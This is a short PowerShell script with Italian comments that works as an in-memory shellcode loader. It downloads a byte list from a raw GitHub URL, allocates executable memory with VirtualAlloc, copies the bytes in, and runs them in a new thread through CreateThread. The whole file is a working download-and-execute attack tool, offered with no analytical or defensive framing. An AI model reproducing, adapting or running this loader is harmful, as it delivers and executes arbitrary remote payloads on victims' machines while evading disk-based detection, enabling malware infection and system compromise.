# Definisci il link raw di GitHub
$rawUrl = "https://github.com/Vittix07/Xcap5/raw/main/file1"

# Scarica il contenuto dal link raw
$response = Invoke-WebRequest -Uri $rawUrl -UseBasicParsing

# Converti il contenuto (che è una stringa di byte separati da virgole) in array di byte
$byteArray = $response.Content -split ',' | ForEach-Object { [byte]$_ }

# Funzione per caricare e eseguire il shellcode in memoria
function Invoke-Shellcode {
    param (
        [Byte[]]$Shellcode
    )

    # Definisci le funzioni P/Invoke necessarie
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class UnsafeNativeMethods {
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    }
"@

    # Alloca memoria per il shellcode
    $size = $Shellcode.Length
    $addr = [UnsafeNativeMethods]::VirtualAlloc([IntPtr]::Zero, $size, 0x1000, 0x40)

    # Copia il shellcode in memoria
    [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $addr, $size)

    # Crea un nuovo thread per eseguire il shellcode
    $thread = [UnsafeNativeMethods]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

    # Attende il completamento del thread
    [UnsafeNativeMethods]::WaitForSingleObject($thread, [uint32]4294967295)
}

# Esegui il shellcode scaricato
Invoke-Shellcode -Shellcode $byteArray